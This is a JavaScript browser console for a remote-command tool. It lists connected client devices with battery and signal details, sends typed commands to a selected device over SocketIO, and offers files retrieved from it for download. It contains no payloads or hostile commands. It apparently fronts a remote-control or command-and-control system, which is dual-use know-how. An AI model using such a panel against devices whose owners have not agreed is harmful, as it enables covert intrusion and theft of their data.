// Console-specific state
let selectedClientId = null;

// Render the clients list
function renderClients() {
    const clientsList = document.getElementById('clientsList');
    const clientCount = document.getElementById('clientCount');

    clientCount.textContent = Object.keys(clients).length;

    if (Object.keys(clients).length === 0) {
        clientsList.innerHTML = '<p class="empty-message">No clients connected</p>';
        return;
    }

    clientsList.innerHTML = '';

    Object.values(clients).forEach(client => {
        const clientCard = document.createElement('div');
        clientCard.className = 'client-card';
        if (client.client_id === selectedClientId) {
            clientCard.classList.add('active');
        }

        const displayName = client.sys_info ? escapeHtml(client.sys_info) : client.client_id;
        
        // Parse battery
        let batteryStr = '--';
        if (client.battery) {
            const battMatch = client.battery.match(/Level:\s+(\d+%)/i);
            if (battMatch) batteryStr = `🔋 ${battMatch[1]}`;
        }
        
        // Parse network
        let networkStr = '--';
        let signalStr = '--';
        if (client.network_info) {
            if (client.network_info.includes('Type: Wi-Fi')) {
                networkStr = '🌐 WiFi';
                const rssiMatch = client.network_info.match(/RSSI:\s+(-?\d+\s+dBm)/i);
                if (rssiMatch) signalStr = `📶 ${rssiMatch[1]}`;
            } else if (client.network_info.includes('Type: Cellular')) {
                networkStr = '📡 Cellular';
                const signalMatch = client.network_info.match(/Signal Strength:\s+(-?\d+\s+dBm)/i);
                if (signalMatch) signalStr = `📶 ${signalMatch[1]}`;
            }
        }

        clientCard.innerHTML = `
            <div class="client-id">${displayName}</div>
            <div class="client-info">
                <span>IP: ${client.ip}:${client.port}</span>
                <span>Connected: ${client.connected_at}</span>
            </div>
            <div class="client-extra-info" style="font-size: 0.8em; color: var(--text-muted); display: flex; gap: 8px; margin-top: 4px;">
                <span>${batteryStr}</span>
                <span>${networkStr}</span>
                <span>${signalStr}</span>
            </div>
        `;

        clientCard.addEventListener('click', () => selectClient(client.client_id));
        clientsList.appendChild(clientCard);
    });
}

// Select a client
function selectClient(clientId) {
    selectedClientId = clientId;
    renderClients();
    updateSelectedClientDisplay();
    enableCommandInput();

    // Add selection message to output
    const client = clients[clientId];
    const displayName = client.sys_info ? client.sys_info : clientId;
    addSystemMessage(`Selected client: ${displayName} (${client.ip}:${client.port})`);
}

// Update the selected client display
function updateSelectedClientDisplay() {
    const selectedClientElement = document.getElementById('selectedClient');

    if (selectedClientId && clients[selectedClientId]) {
        const client = clients[selectedClientId];
        const displayName = client.sys_info ? client.sys_info : selectedClientId;
        
        let batteryStr = '--';
        if (client.battery) {
            const battMatch = client.battery.match(/Level:\s+(\d+%)/i);
            if (battMatch) batteryStr = `🔋 ${battMatch[1]}`;
        }
        
        let networkStr = '--';
        let signalStr = '--';
        if (client.network_info) {
            if (client.network_info.includes('Type: Wi-Fi')) {
                networkStr = '🌐 WiFi';
                const rssiMatch = client.network_info.match(/RSSI:\s+(-?\d+\s+dBm)/i);
                if (rssiMatch) signalStr = `📶 ${rssiMatch[1]}`;
            } else if (client.network_info.includes('Type: Cellular')) {
                networkStr = '📡 Cellular';
                const signalMatch = client.network_info.match(/Signal Strength:\s+(-?\d+\s+dBm)/i);
                if (signalMatch) signalStr = `📶 ${signalMatch[1]}`;
            }
        }

        selectedClientElement.innerHTML = `
            <div>${escapeHtml(displayName)})</div>
        `;
        selectedClientElement.classList.add('active');
    } else {
        selectedClientElement.textContent = 'No client selected';
        selectedClientElement.classList.remove('active');
    }
}

// Enable command input
function enableCommandInput() {
    document.getElementById('commandInput').disabled = false;
    document.getElementById('sendButton').disabled = false;
    document.getElementById('commandInput').focus();
}

// Disable command input
function disableCommandInput() {
    document.getElementById('commandInput').disabled = true;
    document.getElementById('sendButton').disabled = true;
}

// Send command to selected client
function sendCommand() {
    if (!selectedClientId) {
        addSystemMessage('Error: No client selected');
        return;
    }

    const commandInput = document.getElementById('commandInput');
    const command = commandInput.value.trim();

    if (!command) {
        return;
    }

    // Add command to output
    addCommandToOutput(command);

    // Send via SocketIO
    socket.emit('send_command', {
        client_id: selectedClientId,
        command: command
    });

    // Clear input
    commandInput.value = '';
}

// Handle command response
function handleCommandResponse(data) {
    if (!data.success) {
        addErrorToOutput(data.error || 'Unknown error');
        return;
    }

    if (data.file_download) {
        addFileDownloadToOutput(data.response, data.filename);
    } else {
        addResponseToOutput(data.response);
    }
}

// Add command to output
function addCommandToOutput(command) {
    const outputDiv = document.getElementById('commandOutput');

    // Remove welcome message if present
    const welcomeMessage = outputDiv.querySelector('.welcome-message');
    if (welcomeMessage) {
        welcomeMessage.remove();
    }

    const timestamp = new Date().toLocaleTimeString();

    const commandEntry = document.createElement('div');
    commandEntry.className = 'command-entry';
    commandEntry.innerHTML = `
        <div class="command-header">
            <span class="command-text">$ ${escapeHtml(command)}</span>
            <span class="command-time">${timestamp}</span>
        </div>
    `;

    outputDiv.appendChild(commandEntry);
    outputDiv.scrollTop = outputDiv.scrollHeight;
}

// Add response to output
function addResponseToOutput(response) {
    const outputDiv = document.getElementById('commandOutput');
    const lastEntry = outputDiv.querySelector('.command-entry:last-child');

    if (lastEntry) {
        const responseDiv = document.createElement('div');
        responseDiv.className = 'command-response';
        responseDiv.textContent = response || '(no response)';
        lastEntry.appendChild(responseDiv);
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}

// Add error to output
function addErrorToOutput(error) {
    const outputDiv = document.getElementById('commandOutput');
    const lastEntry = outputDiv.querySelector('.command-entry:last-child');

    if (lastEntry) {
        const errorDiv = document.createElement('div');
        errorDiv.className = 'command-error';
        errorDiv.textContent = `Error: ${error}`;
        lastEntry.appendChild(errorDiv);
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}

// Add file download message to output
function addFileDownloadToOutput(response, filename) {
    const outputDiv = document.getElementById('commandOutput');
    const lastEntry = outputDiv.querySelector('.command-entry:last-child');

    if (lastEntry) {
        const fileDiv = document.createElement('div');
        fileDiv.className = 'file-download';
        fileDiv.innerHTML = `
            <strong>File Download Complete</strong><br>
            ${escapeHtml(response)}<br>
            <a href="/api/downloads/${encodeURIComponent(filename)}"
               download="${filename}"
               style="color: #10b981; text-decoration: underline; cursor: pointer;">
                Download ${escapeHtml(filename)}
            </a>
        `;
        lastEntry.appendChild(fileDiv);
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}

// Add system message
function addSystemMessage(message) {
    const outputDiv = document.getElementById('commandOutput');

    const timestamp = new Date().toLocaleTimeString();

    const systemEntry = document.createElement('div');
    systemEntry.className = 'command-entry';
    systemEntry.innerHTML = `
        <div class="command-header">
            <span class="command-text" style="color: #f59e0b;">${escapeHtml(message)}</span>
            <span class="command-time">${timestamp}</span>
        </div>
    `;

    outputDiv.appendChild(systemEntry);
    outputDiv.scrollTop = outputDiv.scrollHeight;
}

window.onClientStatusUpdated = function(data) {
    if (selectedClientId === data.client_id) {
        updateSelectedClientDisplay();
    }
    renderClients();
};

// Clear output
function clearOutput() {
    const outputDiv = document.getElementById('commandOutput');
    outputDiv.innerHTML = '<div class="welcome-message"><p>Output cleared</p></div>';
}

// Callback hooks for shared.js
window.onClientConnected = (data) => {
    renderClients();
};

window.onClientDisconnected = (clientId, client) => {
    if (selectedClientId === clientId) {
        const displayName = client?.sys_info || clientId;
        selectedClientId = null;
        updateSelectedClientDisplay();
        disableCommandInput();
        addSystemMessage(`Client ${displayName} disconnected`);
    }
    renderClients();
};

window.onClientInfoUpdated = (data) => {
    renderClients();
    if (selectedClientId === data.client_id) {
        updateSelectedClientDisplay();
    }
};

window.onCommandResponse = (data) => {
    handleCommandResponse(data);
};

window.onClientsLoaded = (data) => {
    renderClients();
};

window.onPageLoad = () => {
    // Command input event listeners
    const commandInput = document.getElementById('commandInput');
    const sendButton = document.getElementById('sendButton');
    const clearButton = document.getElementById('clearButton');
    const commandSuggestionSelect = document.getElementById('commandSuggestionSelect');

    sendButton.addEventListener('click', sendCommand);
    clearButton.addEventListener('click', clearOutput);

    commandInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            sendCommand();
        }
    });

    if (commandSuggestionSelect) {
        commandSuggestionSelect.addEventListener('change', () => {
            const cmd = commandSuggestionSelect.value;
            if (!cmd) {
                return;
            }

            commandInput.value = cmd;
            commandInput.focus();
            commandSuggestionSelect.value = '';
        });
    }
};
